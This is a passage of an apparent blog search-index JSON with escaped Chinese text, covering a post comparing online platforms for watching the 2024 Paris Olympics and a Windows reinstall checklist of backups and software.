8\u5927\u4e3b\u9898\u529f\u80fd\u6f14\u793a\u6559\u7a0b_\u54d4\u54e9\u54d4\u54e9bilibili</p>","tags":["retroarch","\u865a\u62df\u6e38\u620f\u623f"]},{"location":"%E4%B8%AA%E4%BA%BA/2024/08/10/%E7%9C%8B%E5%A5%A5%E8%BF%90%E4%BC%9A%E7%9A%84%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF/","title":"\u770b\u5965\u8fd0\u4f1a\u7684\u5404\u79cd\u59ff\u52bf","text":"<p>\u4f5c\u4e3a\u7b2c\u4e00\u6b21\u8ba4\u771f\u89c2\u770b\u5965\u8fd0\u6bd4\u8d5b\uff0c\u89c9\u5f97\u6709\u5fc5\u8981\u8bb0\u5f55\u4e0b\u6211\u7684\u89c2\u770b\u65b9\u6cd5\u3002</p>","tags":["\u5965\u8fd0\u4f1a","paris","olympics","NHK"]},{"location":"%E4%B8%AA%E4%BA%BA/2024/08/10/%E7%9C%8B%E5%A5%A5%E8%BF%90%E4%BC%9A%E7%9A%84%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF/#\u5e73\u53f0\u603b\u7ed3","title":"\u5e73\u53f0\u603b\u7ed3","text":"","tags":["\u5965\u8fd0\u4f1a","paris","olympics","NHK"]},{"location":"%E4%B8%AA%E4%BA%BA/2024/08/10/%E7%9C%8B%E5%A5%A5%E8%BF%90%E4%BC%9A%E7%9A%84%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF/#\u6240\u6709\u5e73\u53f0","title":"\u6240\u6709\u5e73\u53f0","text":"<p>\u5b98\u65b9\u5217\u51fa\u4e86\u5404\u4e2a\u56fd\u5bb6\u89c2\u770b\u5965\u8fd0\u7684\u5e73\u53f0\uff1aWhere to watch Paris 2024 Olympic Games live (olympics.com)</p> <p>\u4ee5\u4e2d\u56fd\u548c\u65e5\u672c\u4e3a\u4f8b\uff1a</p> <ul> <li>TV \u5e73\u53f0<ul> <li>\u4e2d\u56fd\u662f CCTV 5, CCTV 5+, CCTV 1, CCTV 16</li> <li>\u65e5\u672c NHK</li> </ul> </li> <li>\u7f51\u7edc\u5e73\u53f0<ul> <li>\u4e2d\u56fd\uff1a\u54aa\u5495\u89c6\u9891\u3001\u592e\u89c6\u9891</li> <li>\u65e5\u672c\uff1a\u4e3b\u8981\u662f NHK\uff1aNHK \u30d1\u30ea \u30aa\u30ea\u30f3\u30d4\u30c3\u30af2024</li> </ul> </li> </ul> <p>\u5404\u4e2a\u5e73\u53f0\u5927\u90e8\u5206\u90fd\u63a8\u51fa\u4e86\u624b\u673a APP \u7248\u672c\uff0c\u529f\u80fd\u66f4\u52a0\u4e30\u5bcc\uff0c\u6bd4\u5982\u54aa\u5495\u89c6\u9891\u652f\u6301\u5206\u5c4f\u540c\u65f6\u64ad\u653e 4 \u6761\u89c6\u9891\u6d41\uff0c\u89c2\u770b\u4e0d\u540c\u7684\u89e3\u8bf4\u3002\u67e5\u770b\u6bd4\u8d5b\u9879\u76ee\u7b49\u4e5f\u975e\u5e38\u65b9\u4fbf\u3002</p> <p>\u4e0d\u8fc7\u6211\u66f4\u4e60\u60ef\u4f7f\u7528\u7535\u8111\u89c2\u770b\uff0c\u56e0\u6b64\u4e3b\u8981\u5173\u6ce8 Web \u5e73\u53f0\u3002</p>","tags":["\u5965\u8fd0\u4f1a","paris","olympics","NHK"]},{"location":"%E4%B8%AA%E4%BA%BA/2024/08/10/%E7%9C%8B%E5%A5%A5%E8%BF%90%E4%BC%9A%E7%9A%84%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF/#\u70b9\u8bc4","title":"\u70b9\u8bc4","text":"<ul> <li>\u54aa\u5495\u89c6\u9891<ul> <li>\u4f18\u70b9<ul> <li>\u591a\u4e2a\u89c6\u9891\u6d41\u968f\u65f6\u5207\u6362\u3002\u5305\u542b\u5e73\u53f0\u5609\u5bbe\u89e3\u8bf4\u7248\u672c\u3001\u592e\u89c6\u7248\u672c\u3001\u73b0\u573a\u539f\u59cb\u753b\u9762\u7248\u672c\uff08\u65e0\u5e7f\u544a\uff09\u3001AI \u5b57\u5e55\u7248\u672c\uff08\u4e3a\u4e86\u542c\u969c\u4eba\u58eb\uff09\u3001\u5404\u79cd\u7f51\u7edc UP \u89e3\u8bf4\u7248\u672c\uff08\u76ee\u7684\u662f\u76f4\u64ad\u5e26\u8d27\uff0c\u4f46\u662f\u8bb8\u6615\u7684\u76f4\u64ad\u95f4\u5206\u6790\u8fd8\u662f\u5f88\u4e13\u4e1a\u7684\uff09\u3002</li> <li>\u9875\u9762\u5e03\u5c40\u8fd8\u7b97\u5408\u7406\uff0c\u53ef\u4ee5\u65b9\u4fbf\u6309\u7167\u9879\u76ee\u548c\u65f6\u95f4\u627e\u5230\u76f4\u64ad\u7684\u6bd4\u8d5b\u3002</li> <li>\u6709\u5f39\u5e55\uff0c\u66f4\u6709\u53c2\u4e0e\u611f</li> </ul> </li> <li>\u7f3a\u70b9<ul> <li>\u5ef6\u8fdf\u9ad8\u3002\u4ee5\u5965\u6797\u5339\u514b\u5b98\u7f51\u6bd4\u5206\u6570\u636e\u4e3a\u57fa\u51c6\uff0c\u5dee\u4e86\u6709 20-30 s\u3002\u4ee5\u4e52\u4e53\u7403\u6bd4\u8d5b\u4e3a\u4f8b\uff0c\u8fd9\u4e2a\u5ef6\u8fdf\u53ef\u80fd\u76f8\u5dee 2-3 \u5206</li> <li>1080p \u9700\u8981\u4f1a\u5458\u624d\u80fd\u770b\uff08\u4f46\u662f\u597d\u50cf\u767b\u5f55\u5c31\u662f vip\uff09</li> <li>1080p \u5f88\u7cca</li> </ul> </li> </ul> </li> <li>\u592e\u89c6\u9891 /\u592e\u89c6\u7f51<ul> <li>\u4f18\u70b9<ul> <li>CCTV 5 \u89c6\u9891\u6d41\u6bd4\u54aa\u5495\u89c6\u9891\u5609\u5bbe\u89e3\u8bf4\u7248\u672c\u5ef6\u8fdf\u4f4e 5-10 \u79d2\u5de6\u53f3\u3002</li> <li>\u592e\u89c6\u89e3\u8bf4\u6bd4\u8f83\u4eb2\u5207\u3002\u54aa\u5495\u89c6\u9891\u89e3\u8bf4\u770b\u5609\u5bbe\u6c34\u5e73\uff0c\u6709\u7684\u559c\u6b22\u6709\u7684\u4e0d\u559c\u6b22\u3002</li> <li>1080p \u4e0d\u9700\u8981\u4f1a\u5458\uff0c\u4e0d\u9700\u8981\u767b\u5f55</li> <li>\u592e\u89c6\u9891\u9875\u9762\u6700\u7cbe\u7b80</li> </ul> </li> <li>\u7f3a\u70b9<ul> <li>CCTV 5 \u89c6\u9891\u6d41\uff0c\u4e00\u573a\u6bd4\u8d5b\u4e00\u5c0f\u5c40\u7ed3\u675f\u7684 1-2 \u5206\u949f\u4f1a\u63d2\u5165\u5e7f\u544a\uff0c\u4f1a\u9519\u8fc7\u4e00\u4e9b\u73b0\u573a\u753b\u9762\u3002</li> <li>1080p \u540c\u6837\u5f88\u7cca</li> </ul> </li> </ul> </li> <li>NHK<ul> <li>\u4f18\u70b9<ul> <li>\u5ef6\u8fdf\u76f8\u5bf9\u4e8e\u5965\u6797\u5339\u514b\u5b98\u7f51 &lt; 10s \u5ef6\u8fdf\u3002\u6bd4 CCTV5 \u5feb\u4e86\u8fd1 10 s</li> <li>1080p \u514d\u8d39\uff0c\u6e05\u6670\u5ea6\u6bd4\u56fd\u5185\u9ad8\u4e00\u6863</li> <li>\u53ef\u4ee5\u968f\u65f6\u56de\u653e</li> <li>\u82f1\u8bed\u89e3\u8bf4\uff08\u4e3b\u8981\u662f\u4e52\u4e53\u7403\u7684\u82f1\u8bed\u89e3\u8bf4\u5458\u592a\u7ecf\u5178\u4e86\uff0c\u611f\u89c9\u4e00\u76f4\u662f\u4ed6\u3002\u63a8\u8350\u540c\u65f6\u6253\u5f00\u56fd\u5185\u89e3\u8bf4\u548c\u82f1\u8bed\u89e3\u8bf4\uff0c\u4e0d\u540c\u7684\u89e3\u8bf4\u98ce\u683c\uff09</li> </ul> </li> <li>\u7f3a\u70b9<ul> <li>\u7f51\u9875\u9650\u5236\u65e5\u672c IP \u8bbf\u95ee</li> </ul> </li> </ul> </li> </ul>","tags":["\u5965\u8fd0\u4f1a","paris","olympics","NHK"]},{"location":"%E4%B8%AA%E4%BA%BA/2024/08/10/%E7%9C%8B%E5%A5%A5%E8%BF%90%E4%BC%9A%E7%9A%84%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF/#\u5e73\u53f0\u5c55\u793a","title":"\u5e73\u53f0\u5c55\u793a","text":"","tags":["\u5965\u8fd0\u4f1a","paris","olympics","NHK"]},{"location":"%E4%B8%AA%E4%BA%BA/2024/08/10/%E7%9C%8B%E5%A5%A5%E8%BF%90%E4%BC%9A%E7%9A%84%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF/#\u592e\u89c6\u9891","title":"\u592e\u89c6\u9891","text":"<p>\u592e\u89c6\u9891 - \u6709\u54c1\u8d28\u7684\u89c6\u9891\u793e\u4ea4\u5a92\u4f53 (yangshipin.cn)</p> <p>\u6ca1\u6709\u5404\u79cd\u5f2f\u5f2f\u7ed5\u7ed5\u7684\u9875\u9762\uff0c\u53ea\u6709 CCTV 5 \u548c CCTV 5+ \u5728\u64ad\u653e\u5965\u8fd0\u6bd4\u8d5b\u3002\u5e76\u4e14\u6709\u8282\u76ee\u5355\uff0c\u53ef\u4ee5\u770b\u5230\u54ea\u4e9b\u662f\u76f4\u64ad\u54ea\u4e9b\u662f\u5f55\u64ad\u3002</p> <p></p> <p>yangshipin.cn \u6574\u4e2a\u7f51\u9875\uff0c\u73b0\u5728\u53ea\u6709\u201c\u63a8\u8350\u201d\u3001\u201c\u7535\u89c6\u201d\u3001\u201c\u8282\u76ee\u5e93\u201d \u4e09\u4e2a\u6807\u7b7e\u9875\uff0c\u6211\u89c9\u5f97\u662f\u5341\u5206\u7cbe\u7b80\u7684\u3002\u7cbe\u7b80\u540c\u65f6\u6db5\u76d6\u4e86\u4e3b\u8981\u7684\u529f\u80fd\uff0c\u597d\u8bc4\u3002 </p>","tags":["\u5965\u8fd0\u4f1a","paris","olympics","NHK"]},{"location":"%E4%B8%AA%E4%BA%BA/2024/08/10/%E7%9C%8B%E5%A5%A5%E8%BF%90%E4%BC%9A%E7%9A%84%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF/#\u592e\u89c6\u7f51","title":"\u592e\u89c6\u7f51","text":"<p>\u592e\u89c6\u7f51\u76f8\u6bd4\u4e8e\u592e\u89c6\u9891\u662f\u4e00\u4e2a\u66f4\u7efc\u5408\u7684\u4fe1\u606f\u5e73\u53f0\uff08TLD \u4e3a cctv.com\uff09\uff0c\u5305\u542b\u4e86\u5927\u91cf\u680f\u76ee\u3002 </p> <p>\u592e\u89c6\u7f51\u7ed9\u5df4\u9ece\u6d3b\u52a8\u4e13\u95e8\u505a\u4e86\u4e00\u4e2a\u7f51\u9875\uff0c\u663e\u793a\u4e86\u91d1\u724c\u603b\u6570\u3001\u6bd4\u8d5b\u9879\u76ee\u3001\u4e13\u95e8\u8282\u76ee\u7b49\uff0c\u586b\u8865\u4e86\u592e\u89c6\u9891\u8fc7\u4e8e\u7cbe\u7b80\u7684\u4e0d\u8db3\u3002 2024\u5df4\u9ece\u5965\u8fd0\u4f1a_\u4f53\u80b2_\u592e\u89c6\u7f51(cctv.com) </p>","tags":["\u5965\u8fd0\u4f1a","paris","olympics","NHK"]},{"location":"%E4%B8%AA%E4%BA%BA/2024/08/10/%E7%9C%8B%E5%A5%A5%E8%BF%90%E4%BC%9A%E7%9A%84%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF/#\u54aa\u5495\u89c6\u9891","title":"\u54aa\u5495\u89c6\u9891","text":"<p>\u5965\u8fd0\u4e13\u533a\u4e3b\u9875\u9762\uff0c\u53ef\u4ee5\u67e5\u770b\u5f53\u524d\u6240\u6709\u76f4\u64ad \u54aa\u5495\u89c6\u9891\u4f53\u80b2\u9891\u9053-\u7cbe\u5f69\u8d5b\u4e8b\u5728\u7ebf\u76f4\u64ad (miguvideo.com) </p> <p>\u76f4\u64ad\u9875\u9762\uff0c\u53ef\u4ee5\u5207\u6362\u89c6\u9891\u6d41\uff0c\u67e5\u770b\u5f39\u5e55\u7b49 </p> <p>\u529f\u80fd\u9875\u9762\uff0c\u53ef\u4ee5\u6839\u636e\u9879\u76ee\u3001\u65f6\u95f4\u7b5b\u9009\u6bd4\u8d5b\u3002 \u54aa\u5495\u89c6\u9891 (miguvideo.com) </p>","tags":["\u5965\u8fd0\u4f1a","paris","olympics","NHK"]},{"location":"%E4%B8%AA%E4%BA%BA/2024/08/10/%E7%9C%8B%E5%A5%A5%E8%BF%90%E4%BC%9A%E7%9A%84%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF/#nhk","title":"NHK","text":"<p>NHK \u30d1\u30ea \u30aa\u30ea\u30f3\u30d4\u30c3\u30af2024</p> <p>\u4e3b\u9875\u9762\uff0c\u5c55\u793a\u4e86\u5f53\u524d\u6240\u6709 \u30e9\u30a4\u30d6 \uff08Live\uff09\u7684\u6bd4\u8d5b\uff0c\u8fd8\u662f\u6bd4\u8f83\u7b80\u6d01\u7684\u3002 </p> <p>\u4e00\u4e2a\u6709\u521b\u610f\u7684\uff0c\u5c55\u793a\u5f53\u524d\u6240\u6709\u6bd4\u8d5b\u7684\u65f6\u95f4\u56fe\u3002\u76f8\u6bd4\u4e8e\u56fd\u5185\u7ad6\u7740\u4e00\u7ef4\u6392\u5217\uff0c\u6548\u679c\u786e\u5b9e\u66f4\u597d\u3002 </p> <p>\u8fd9\u91cc\u7684 BS/BSP4K/BS8K \u4e0d\u77e5\u9053 BS \u5177\u4f53\u4ec0\u4e48\u542b\u4e49\uff0c\u4f46\u662f\u6e05\u6670\u5ea6\u80af\u5b9a\u662f\u8d8a\u6765\u8d8a\u9ad8\u7684\u3002 </p> <p>NHK plus \u4e0d\u77e5\u9053\u4e3a\u5565\u5c31\u6709\u70b9\u62c9\u4e86\u3002\u76f4\u64ad\u7684\u6bd4\u8d5b\u5f88\u5c11\uff0c\u7279\u70b9\u662f NHK \u6bd4\u8d5b\u662f\u82f1\u8bed\u89e3\u8bf4\u7684\uff0c\u8fd9\u4e2a\u662f\u65e5\u8bed\u89e3\u8bf4\u3002 </p> <p>\u5e76\u4e14\u795e\u5947\u7684\u662f\uff0c\u521a\u597d\u9047\u5230\u65e5\u672c\u53d1\u751f\u5730\u9707\u4e86\uff0c\u6240\u4ee5\u76f4\u64ad\u4fe1\u53f7\u5728\u663e\u793a\u707e\u96be\u9884\u8b66\u3002 </p>","tags":["\u5965\u8fd0\u4f1a","paris","olympics","NHK"]},{"location":"%E4%B8%AA%E4%BA%BA/2024/08/10/%E7%9C%8B%E5%A5%A5%E8%BF%90%E4%BC%9A%E7%9A%84%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF/#youtube-\u76f4\u64ad","title":"youtube \u76f4\u64ad","text":"<p>\u4e0d\u77e5\u9053 youtube \u8fd9\u4e2a\u76f4\u64ad\u4e3a\u4ec0\u4e48\u6709\u7248\u6743\u3002\u56fd\u5185\u6240\u6709\u89c6\u9891\u5e73\u53f0\u90fd\u6ca1\u6709\u7248\u6743\u653e\u6bd4\u8d5b\u89c6\u9891\u753b\u9762\u3002 </p>","tags":["\u5965\u8fd0\u4f1a","paris","olympics","NHK"]},{"location":"%E4%B8%AA%E4%BA%BA/2024/08/10/%E7%9C%8B%E5%A5%A5%E8%BF%90%E4%BC%9A%E7%9A%84%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF/#\u5176\u5b83\u6709\u7528\u7f51\u7ad9","title":"\u5176\u5b83\u6709\u7528\u7f51\u7ad9","text":"","tags":["\u5965\u8fd0\u4f1a","paris","olympics","NHK"]},{"location":"%E4%B8%AA%E4%BA%BA/2024/08/10/%E7%9C%8B%E5%A5%A5%E8%BF%90%E4%BC%9A%E7%9A%84%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF/#\u5965\u6797\u5339\u514b\u5b98\u7f51","title":"\u5965\u6797\u5339\u514b\u5b98\u7f51","text":"","tags":["\u5965\u8fd0\u4f1a","paris","olympics","NHK"]},{"location":"%E4%B8%AA%E4%BA%BA/2024/08/10/%E7%9C%8B%E5%A5%A5%E8%BF%90%E4%BC%9A%E7%9A%84%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF/#\u8d5b\u7a0b\u5bf9\u9635\u8868","title":"\u8d5b\u7a0b\uff0c\u5bf9\u9635\u8868","text":"<p>\u67e5\u770b\u6bd4\u8d5b\u8d5b\u7a0b\uff0c\u6dd8\u6c70\u8d5b\u53ef\u4ee5\u67e5\u770b\u5bf9\u9635\u8868\uff0c\u975e\u5e38\u6e05\u6670</p> <p>\u5bf9\u9635\u8868 \u4e52\u4e53\u7403 - \u7537\u5b50\u56e2\u4f53 (olympics.com) </p>","tags":["\u5965\u8fd0\u4f1a","paris","olympics","NHK"]},{"location":"%E4%B8%AA%E4%BA%BA/2024/08/10/%E7%9C%8B%E5%A5%A5%E8%BF%90%E4%BC%9A%E7%9A%84%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF/#\u6bd4\u8d5b\u6210\u7ee9","title":"\u6bd4\u8d5b\u6210\u7ee9","text":"<p>\u5b9e\u65f6\u663e\u793a\u6bd4\u8d5b\u6210\u7ee9\uff0c\u7ec6\u8282\u5230\u8c01\u5728\u53d1\u7403\uff0c\u53eb\u6682\u505c\u90fd\u4f1a\u5c55\u793a\u3002</p> <p>ps. \u6570\u636e\u6bd4\u6240\u6709\u76f4\u64ad\u6e90\u90fd\u8981\u5feb\uff0c\u770b\u6bd4\u8d5b\u65f6\u6253\u5f00\uff0c\u8ba9\u4f60\u4f53\u9a8c\u9884\u77e5\u672a\u6765\u7684\u611f\u89c9\u3002</p> <p>HARIMOTO Tomokazu vs FAN Zhendong - \u7537\u5b50\u5355\u62531/4\u51b3\u8d5b \u5c40 63 - \u4e52\u4e53\u7403 | 2024\u5e74\u5df4\u9ece\u5965\u8fd0\u4f1a (olympics.com) </p>","tags":["\u5965\u8fd0\u4f1a","paris","olympics","NHK"]},{"location":"%E4%B8%AA%E4%BA%BA/2024/08/10/%E7%9C%8B%E5%A5%A5%E8%BF%90%E4%BC%9A%E7%9A%84%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF/#\u8fd0\u52a8\u5458\u4e3b\u9875","title":"\u8fd0\u52a8\u5458\u4e3b\u9875","text":"<p>\u542c\u8fd0\u52a8\u5458\u62fc\u8bfb\u81ea\u5df1\u540d\u5b57\u5b9e\u5728\u592a\u6709\u8da3\u4e86 :)</p> <p>HAYATA Hina (olympics.com) </p>","tags":["\u5965\u8fd0\u4f1a","paris","olympics","NHK"]},{"location":"%E4%B8%AA%E4%BA%BA/2024/08/10/%E7%9C%8B%E5%A5%A5%E8%BF%90%E4%BC%9A%E7%9A%84%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF/#\u5b9e\u65f6\u535a\u5ba2","title":"\u5b9e\u65f6\u535a\u5ba2","text":"<p>\u5feb\u901f\u67e5\u770b\u6bd4\u8d5b\u6700\u65b0\u7ed3\u679c\uff0c\u65b0\u95fb\u7a3f</p> <p>\u5df4\u9ece2024\u5b9e\u65f6\u535a\u5ba2 - \u5965\u8fd0\u4f1a\u5b9e\u65f6\u52a8\u6001\u548c\u52b2\u7206\u65b0\u95fb (olympics.com) </p>","tags":["\u5965\u8fd0\u4f1a","paris","olympics","NHK"]},{"location":"%E4%B8%AA%E4%BA%BA/2024/08/10/%E7%9C%8B%E5%A5%A5%E8%BF%90%E4%BC%9A%E7%9A%84%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF/#\u6bd4\u8d5b\u7ed3\u679c\u5b98\u65b9\u62a5\u544a","title":"\u6bd4\u8d5b\u7ed3\u679c\u5b98\u65b9\u62a5\u544a","text":"<p>\u53d1\u73b0\u4e86\u56e2\u4f53\u6bd4\u8d5b\u4e2d\u7684\u52b3\u6a21\u5f20\u672c\u667a\u548c</p> <p>\u5b98\u65b9\u62a5\u544a \u4e52\u4e53\u7403 (olympics.com) </p>","tags":["\u5965\u8fd0\u4f1a","paris","olympics","NHK"]},{"location":"%E4%B8%AA%E4%BA%BA/2024/08/10/%E7%9C%8B%E5%A5%A5%E8%BF%90%E4%BC%9A%E7%9A%84%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF/#yahoo-japan","title":"Yahoo! JAPAN","text":"<p>\u53ef\u4ee5\u770b\u770b\u65e5\u672c\u4eba\u5bf9\u4e8e\u4e00\u4ef6\u4e8b\u7684\u8bc4\u8bba</p> <p>\uff08\u4f7f\u7528\u6d4f\u89c8\u5668\u7ffb\u8bd1\u529f\u80fd\u7684\u6548\u679c\uff09 \u201c\u5982\u679c\u6b7b\u4f1a\u66f4\u5bb9\u6613......\u201d\u9f13\u52b1\u5f20\u672c\u667a\u548c\u7b49\u4eba\u5728\u5931\u53bb\u4e52\u4e53\u7403\u9274\u8d4f\u5bb6\u5f7c\u5c14\u59c6\u4e0a\u6821\u540e\u4f24\u5fc3\u6b32\u7edd\u201c\u4e0d\u8981\u6279\u8bc4\u5931\u8d25\u7684\u7403\u5458\u201d\uff08J-CAST\u65b0\u95fb\uff09--\u96c5\u864e\u65b0\u95fb --- \u300c\u6b7b\u3093\u3067\u697d\u306b\u306a\u308b\u306a\u3089...\u300d\u8ca0\u3051\u3066\u60b2\u75db\u306e\u5f35\u672c\u667a\u548c\u3089\u306b\u6fc0\u52b1\u3000\u5353\u7403\u901a\u306e\u30d1\u30fc\u30de\u5927\u4f50\u300c\u6557\u308c\u305f\u9078\u624b\u3092\u6279\u5224\u3057\u306a\u3044\u3067\u300d\uff08J-CAST\u30cb\u30e5\u30fc\u30b9\uff09 - Yahoo!\u30cb\u30e5\u30fc\u30b9 </p> <p>\u4e00\u4e2a\u9ad8\u6c34\u5e73\u8bc4\u8bba </p>","tags":["\u5965\u8fd0\u4f1a","paris","olympics","NHK"]},{"location":"%E4%B8%AA%E4%BA%BA/2024/08/10/%E7%9C%8B%E5%A5%A5%E8%BF%90%E4%BC%9A%E7%9A%84%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF/#windows-\u5b9e\u65f6\u5b57\u5e55","title":"Windows \u5b9e\u65f6\u5b57\u5e55","text":"<p>\u542c\u82f1\u8bed\u89e3\u8bf4\u6709\u5b57\u5e55\u7684\u8bdd\u4f1a\u66f4\u65b9\u4fbf\u3002\u597d\u5728 Windows 11 \u7cfb\u7edf\u81ea\u5e26\u5b9e\u65f6\u5b57\u5e55\u7684\u529f\u80fd\uff0cctrl + win + L \u5373\u53ef\u6253\u5f00\u3002\u4e4b\u540e\u8981\u63a8\u7684 Copilot AIPC \u8fd8\u652f\u6301\u672c\u5730\u7ffb\u8bd1\u529f\u80fd\uff0c\u975e\u5e38\u671f\u5f85\u3002\u8be6\u89c1\uff1aUse live captions to better understand audio - Microsoft Support</p> <p>Live captions is available in Windows 11, version 22H2 and later. The ability to translate is available on\u00a0Copilot+ PCs\u00a0running Windows 11, version 24H2 and later.</p> <p>\u6700\u540e\uff0c\u8fd9\u662f\u53cc\u5c4f\u770b\u6bd4\u8d5b\u7684\u6548\u679c\u3002\u5de6\u8fb9\u662f\u56fd\u5185\u89e3\u8bf4\uff0c\u53f3\u8fb9\u662f\u82f1\u8bed\u89e3\u8bf4\uff08\u5c4f\u5e55\u4e0b\u65b9\u4e3a\u82f1\u6587\u5b57\u5e55\uff09\u3002\u770b\u53f3\u4fa7\u753b\u8d28\u66f4\u6e05\u6670\uff0c\u540c\u65f6\u8fd8\u80fd\u770b\u770b\u5de6\u8fb9\u7684\u5f39\u5e55\u3002 </p>","tags":["\u5965\u8fd0\u4f1a","paris","olympics","NHK"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2019/12/21/2019-12-21-write-blog-in-PC-through-sshing-to-a-mobile-phone/","title":"write blog in PC through sshing to a mobile phone","text":"<p>\u8fd9\u662f\u4e00\u7bc7\u6587\u7ae0\u3002</p>","tags":["termux","hexo"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020/02/02/2020-02-02-windows%E9%87%8D%E8%A3%85%E7%B3%BB%E7%BB%9F%E6%AD%A5%E9%AA%A4/","title":"windows \u91cd\u88c5\u7cfb\u7edf\u6b65\u9aa4","text":"<p>windows \u91cd\u88c5\u7cfb\u7edf\u6b65\u9aa4</p> <ol> <li> <p>\u4e0b\u8f7d iso \u955c\u50cf i.cqu.edu.cn -&gt; \u6b63\u7248\u8f6f\u4ef6 -&gt; windows10-pro</p> </li> <li> <p>\u5236\u4f5c\u542f\u52a8\u76d8 refus\uff08\u6216\u8005\u53ef\u4ee5\u76f4\u63a5\u53cc\u51fb iso \u955c\u50cf\u5b89\u88c5\uff1f\uff09</p> </li> <li> <p>\u4fdd\u5b58 C \u76d8\u6587\u4ef6</p> <ul> <li>home \u914d\u7f6e\uff08ssh, gitconfig\uff09</li> <li>\u77e5\u4e4b\u9605\u8bfb</li> <li>windows terminal \u914d\u7f6e 4. \u5b89\u88c5\uff08\u8df3\u8fc7\u8054\u7f51\u5b89\u88c5\u6700\u5feb\uff0c\u65b9\u5f0f\u4e3a\u4f9d\u6b21\u70b9\u51fb 4 \u4e2a\u89d2\uff09</li> </ul> </li> <li> <p>\u6fc0\u6d3b\uff08\u4e0b\u8f7d\u6fc0\u6d3b\u5668\uff0c\u8f93\u5165\u5b66\u751f\u7edf\u4e00\u8ba4\u8bc1\u53f7\u548c\u91cd\u5927\u6b63\u7248\u8f6f\u4ef6\u7f51\u7ad9\u7684\u6fc0\u6d3b\u7801\uff09</p> </li> <li> <p>\u767b\u5f55\u5fae\u8f6f\u8d26\u53f7\uff0c\u66f4\u65b0\u7cfb\u7edf\uff0c\u91cd\u542f</p> </li> <li> <p>\u4e2a\u6027\u5316    \u6de1\u8272\u3001\u900f\u660e</p> </li> <li> <p>\u8bbe\u7f6e\u5feb\u901f\u8bbf\u95ee</p> <ul> <li>$home</li> <li>Dowloads</li> <li>Document</li> <li>GithubRepo</li> <li>ENV</li> <li>dev</li> </ul> </li> <li> <p>\u6062\u590d\u8f6f\u4ef6</p> </li> </ol> <ul> <li>\u6d4f\u89c8\u5668  Edge \u65b0\u7248\uff0cChrome\uff08\u767b\u5f55\u8d26\u53f7\u5373\u53ef\uff0c\u4f1a\u81ea\u52a8\u6062\u590d\u6536\u85cf\u5939\u3001\u63d2\u4ef6</li> </ul> <ul> <li>basic \u57fa\u7840\u8f6f\u4ef6 (\u5fc5\u5907\u7684\uff0c\u63d0\u5347\u6548\u7387\u7684\u8f6f\u4ef6\u3001\u5168\u5728 E \u76d8\uff08\u56fa\u6001\u76d8\uff09\uff09<ul> <li>listary</li> <li>QQ</li> </ul> </li> <li>ext \u8f6f\u4ef6</li> </ul> <ol> <li>windows \u5546\u5e97\u7a0b\u5e8f<p>- snipaste   - windows terminal</p> </li> </ol> <p>\u5176\u5b83\uff1a</p> <ul> <li>\u6062\u590d wifi \u5bc6\u7801 \u6062\u590d C:\\ProgramData\\Microsoft\\Wlansvc\\Profiles\\Interfaces\\\u4e0b\u6587\u4ef6</li> <li>\u4e4b\u524d\u4f7f\u7528 windows \u7684\u5907\u4efd\u521b\u5efa\u4e86\u7cfb\u7edf\u955c\u50cf\uff0c\u7ed3\u679c\u8fd9\u6b21\u91cd\u88c5\u627e\u4e0d\u5230</li> <li>\u4f7f\u7528 windows \u7684\u6062\u590d-&gt;\u91cd\u7f6e\u7535\u8111\u6765\u91cd\u88c5\u7cfb\u7edf\u975e\u5e38\u6162</li> </ul>","tags":["windows","\u91cd\u88c5\u7cfb\u7edf"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020/02/02/2020-02-02-windows%E9%87%8D%E8%A3%85%E7%B3%BB%E7%BB%9F%E6%AD%A5%E9%AA%A4/#\u5b89\u88c5windows\u540e\u914d\u7f6e","title":"\u5b89\u88c5windows\u540e\u914d\u7f6e","text":"<p>\u517b\u6210\u4e60\u60ef\u7684\u8f6f\u4ef6</p> <ul> <li>listary</li> <li>snipaste</li> <li>bandizip</li> <li>powertoy: 200+MB</li> <li>mouseinc</li> <li>utools</li> </ul> <ul> <li>\u901a\u8baf<ul> <li>TIM</li> <li>Wechat</li> <li>Telegram</li> </ul> </li> <li>\u5f00\u53d1<ul> <li>Windows Terminal</li> <li>VSCode</li> <li>sublime</li> </ul> </li> <li>\u6587\u6863<ul> <li>obsidian</li> </ul> </li> </ul>","tags":["windows","\u91cd\u88c5\u7cfb\u7edf"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020/02/02/2020-02-02-windows%E9%87%8D%E8%A3%85%E7%B3%BB%E7%BB%9F%E6%AD%A5%E9%AA%A4/#2024-update","title":"2024 update","text":"<p>\u9700\u5907\u4efd\u7684\u6587\u4ef6</p> <p>\u7b80\u5355\u7684</p> <ul> <li>\u4e0b\u8f7d</li> <li>\u56fe\u7247</li> <li>\u89c6\u9891</li> <li>\u6587\u6863</li> <li>home<ul> <li>.ssh</li> <li>OpenVPN</li> <li>.config/clash</li> <li>.vscode: \u5305\u542b\u5404\u79cd\u63d2\u4ef6\uff0c&gt;1G</li> </ul> </li> </ul> <p>AppData</p> <ul> <li>Local</li> <li>Roaming<ul> <li>picgo</li> <li>RealVNC</li> </ul> </li> </ul> <p>\u4e60\u60ef\u8f6f\u4ef6\u5217\u8868</p> <ul> <li>wireguard\uff1a\u624b\u52a8\u5bfc\u51fa</li> 